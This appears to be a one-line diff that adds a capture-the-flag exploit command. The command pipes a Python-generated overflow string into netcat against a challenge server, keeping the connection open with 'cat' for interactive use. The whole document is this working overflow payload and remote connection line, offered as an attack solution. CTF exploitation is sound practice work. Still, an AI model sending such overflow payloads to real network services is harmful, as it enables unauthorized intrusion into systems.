@@ -1,0 +1,1 @@
+(python -c 'print "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOO"+"P"'; cat ) | nc chall.ctf.nitdgplug.org 30010
